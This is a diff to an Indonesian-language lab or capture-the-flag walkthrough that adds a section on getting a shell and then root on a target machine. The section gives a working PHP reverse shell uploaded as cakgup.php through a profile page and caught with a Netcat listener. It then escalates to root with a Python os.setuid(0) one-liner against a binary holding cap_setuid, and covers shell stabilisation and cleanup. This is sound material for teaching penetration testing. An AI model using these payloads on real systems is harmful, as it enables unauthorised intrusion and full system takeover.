@@ -794,6 +794,378 @@ hostname
 
 Jangan mengubah password, SSH key, user, cron job, atau konfigurasi sistem kecuali diwajibkan oleh skenario laboratorium.
 
+
+## 7A. Opsi Alternatif — Reverse Shell Netcat Port 1234 lalu Privilege Escalation ke Root
+
+Pada opsi ini, koneksi Netcat pertama kali memberikan shell sebagai user web server:
+
+```text
+www-data
+```
+
+Setelah shell masuk ke listener, privilege escalation dilakukan secara manual dengan memanfaatkan Python yang memiliki capability `cap_setuid=ep`.
+
+Alurnya:
+
+```text
+nc -lvnp 1234
+→ cakgup.php mengirim reverse shell
+→ shell masuk sebagai www-data
+→ enumerasi capability
+→ ditemukan python3.13 cap_setuid=ep
+→ os.setuid(0)
+→ root
+```
+
+---
+
+### 7A.1 Menentukan IP Mesin Kali
+
+Pada Kali:
+
+```bash
+ip -br address
+```
+
+Contoh:
+
+```text
+eth0    UP    192.168.56.5/24
+```
+
+Pada contoh ini, IP Kali adalah:
+
+```text
+192.168.56.5
+```
+
+---
+
+### 7A.2 Menjalankan Listener
+
+Jalankan listener pada Kali sebelum mengakses payload:
+
+```bash
+nc -lvnp 1234
+```
+
+Hasil:
+
+```text
+listening on [any] 1234 ...
+```
+
+Biarkan terminal tetap terbuka.
+
+---
+
+### 7A.3 Isi File `cakgup.php`
+
+Gunakan `cakgup.php` untuk mengirim reverse shell biasa sebagai `www-data`:
+
+```php
+<?php
+$host = "192.168.56.5";
+$port = 1234;
+
+$sock = fsockopen($host, $port);
+
+$process = proc_open(
+    "/bin/sh -i",
+    [
+        0 => $sock,
+        1 => $sock,
+        2 => $sock
+    ],
+    $pipes
+);
+?>
+```
+
+Ganti:
+
+```text
+192.168.56.5
+```
+
+dengan IP Kali apabila berbeda.
+
+Upload file melalui halaman:
+
+```text
+/profile
+```
+
+Kemudian akses:
+
+```text
+http://192.168.56.118:8080/uploads/cakgup.php
+```
+
+---
+
+### 7A.4 Menerima Reverse Shell
+
+Pada listener Kali akan muncul koneksi:
+
+```text
+connect to [192.168.56.5] from (UNKNOWN) [192.168.56.118] 41046
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Pesan:
+
+```text
+can't access tty; job control turned off
+```
+
+normal untuk reverse shell sederhana.
+
+Periksa user saat ini:
+
+```bash
+id
+whoami
+```
+
+Hasil awal:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+```
+
+Pada tahap ini shell **belum root**.
+
+---
+
+### 7A.5 Enumerasi Privilege Escalation
+
+Pemeriksaan SUID dapat dilakukan sebagai enumerasi awal:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Contoh hasil:
+
+```text
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chsh
+```
+
+Selanjutnya periksa Linux capability:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+Hasil penting:
+
+```text
+/usr/bin/python3.13 cap_setuid=ep
+```
+
+Temuan tersebut berarti Python memiliki hak untuk mengubah UID proses.
+
+---
+
+### 7A.6 Menjalankan Privilege Escalation
+
+Dari shell Netcat yang masih berjalan sebagai `www-data`, jalankan:
+
+```bash
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+Apabila alias `python3` tidak mengarah ke binary yang memiliki capability, gunakan path lengkap:
+
+```bash
+/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+Penjelasan payload:
+
+```python
+import os
+```
+
+memuat modul sistem operasi.
+
+```python
+os.setuid(0)
+```
+
+mengubah UID proses menjadi `0`.
+
+```python
+os.execl("/bin/sh", "sh")
+```
+
+mengganti proses Python dengan shell baru.
+
+---
+
+### 7A.7 Verifikasi Root
+
+Setelah payload dijalankan:
+
+```bash
+whoami
+id
+```
+
+Hasil:
+
+```text
+root
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+Pada beberapa konfigurasi hasil `id` dapat menampilkan:
+
+```text
+uid=33(www-data) gid=33(www-data) euid=0(root)
+```
+
+Keduanya menunjukkan privilege escalation berhasil karena proses memiliki UID atau EUID `0`.
+
+Urutan lengkap pada listener:
+
+```bash
+nc -lvnp 1234
+
+# Setelah koneksi masuk:
+id
+whoami
+
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+
+whoami
+id
+```
+
+Output ringkas:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/usr/bin/python3.13 cap_setuid=ep
+root
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+---
+
+### 7A.8 Menstabilkan Shell Setelah Root
+
+Setelah memperoleh root:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Tekan:
+
+```text
+Ctrl+Z
+```
+
+Pada terminal Kali:
+
+```bash
+stty raw -echo
+fg
+```
+
+Tekan `Enter`, kemudian:
+
+```bash
+reset
+export TERM=xterm
+stty rows 40 columns 120
+```
+
+Validasi kembali:
+
+```bash
+id
+whoami
+hostname
+```
+
+---
+
+### 7A.9 Troubleshooting
+
+Jika listener tidak menerima koneksi, pastikan Netcat aktif:
+
+```bash
+ss -lntp | grep ':1234'
+```
+
+Jalankan ulang:
+
+```bash
+nc -lvnp 1234
+```
+
+Jika `os.setuid(0)` menghasilkan:
+
+```text
+PermissionError: [Errno 1] Operation not permitted
+```
+
+periksa capability:
+
+```bash
+getcap /usr/bin/python3.13
+```
+
+Hasil yang diperlukan:
+
+```text
+/usr/bin/python3.13 cap_setuid=ep
+```
+
+Pastikan command menggunakan binary yang benar:
+
+```bash
+command -v python3
+readlink -f "$(command -v python3)"
+```
+
+---
+
+### 7A.10 Cleanup
+
+Keluar dari shell:
+
+```bash
+exit
+```
+
+Hapus file payload:
+
+```bash
+rm -f /var/www/portrait/uploads/cakgup.php
+```
+
+Hentikan listener:
+
+```text
+Ctrl+C
+```
+
 ## 8. Mengapa `cap_setuid` pada Python Berbahaya?
 
 Python merupakan interpreter serbaguna yang dapat menjalankan kode arbitrer.
@@ -1206,6 +1578,7 @@ Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah da
 - [x] Enumerasi Linux capabilities
 - [x] Analisis Python dengan `cap_setuid=ep`
 - [x] Jalankan payload `os.setuid(0)`
+- [x] Uji opsi reverse shell dengan listener `nc -lvnp 1234`
 - [x] Verifikasi `uid=0(root)` atau `euid=0(root)`
 
 ### Cleanup
